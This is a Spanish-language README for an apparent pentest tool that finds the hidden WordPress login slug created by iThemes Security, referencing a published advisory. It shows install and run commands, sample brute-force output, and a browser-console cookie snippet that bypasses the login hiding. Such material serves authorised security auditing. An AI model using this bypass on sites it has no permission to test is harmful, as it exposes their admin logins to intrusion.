# 🔓 Bypass_iThemesSecurity

Herramienta de detección y explotación de slugs ocultos generados por el plugin **iThemes Security** en instalaciones WordPress mal configuradas o desactualizadas.

> ⚠️ Basada en la vulnerabilidad documentada en:  
> [WPScan Advisory - iThemes Security <= 8.1.2](https://wpscan.com/vulnerability/42fdb534-3aef-4ed7-94a8-4cfe8ff977e1)

---

## 🧠 ¿Qué hace esta herramienta?

`Bypass_iThemesSecurity` automatiza la detección de tokens (`slugs`) ocultos usados por iThemes Security para mover el acceso al panel de login de WordPress (`wp-login.php`). Si el sitio está desactualizado o mal configurado, esta herramienta puede encontrar ese slug y permitir el **bypass completo** del ocultamiento.

---

## 🎯 Casos de uso

- Red Teams y Pentesters que necesiten evadir plugins de ocultamiento de login.
- Auditores de seguridad en entornos WordPress.
- Investigadores de seguridad interesados en fingerprinting de instalaciones WordPress.
- Cazadores de bugs que validan configuraciones erróneas.

---

## 🚀 Requisitos

- Python 3.7+
- Librerías:
  - `requests`
  - `beautifulsoup4`
  - `rich`
  - `pyfiglet`

## 📥 Instalación

### 1. Clonar el repositorio

```bash
git clone https://github.com/AndreewNR/Bypass_iThemesSecurity.git
cd Bypass_iThemesSecurity
```

### 2. Instalar dependencias

```bash
pip install -r requirements.txt
```

## ⚙️ Uso

Ejecuta la herramienta con:

```bash
python main.py
```

### 🧪 Ejemplo de uso

[+] Ingresa la URL objetivo (sin / al final): https://tudominio.com

🔍 Iniciando escaneo de slugs ocultos en: https://tudominio.com

🔄 Probando slug: 6bcbbd3fc2
🔄 Probando slug: loginadmin
🔄 Probando slug: abc123...

✅ ¡Bypass exitoso! Slug válido: loginadmin
🔗 Accede directamente: https://tudominio.com/wp-login.php

### 🍪 ¿Y si quieres probar el bypass manualmente?

Puedes simular el bypass en el navegador usando cookies. Si la herramienta detecta un slug válido y entrega cookies, puedes abrir la consola de tu navegador (F12) y ejecutar:
```bash
document.cookie = "itsec-hb-token=loginadmin";
window.location.href = "/wp-login.php";
```

### ⚠️ Descargo de responsabilidad
Esta herramienta es solo para fines educativos y auditorías autorizadas.
El uso no ético o en sistemas sin permiso explícito podría violar leyes locales.
`Autores y colaboradores no se hacen responsables del uso indebido de este software.`


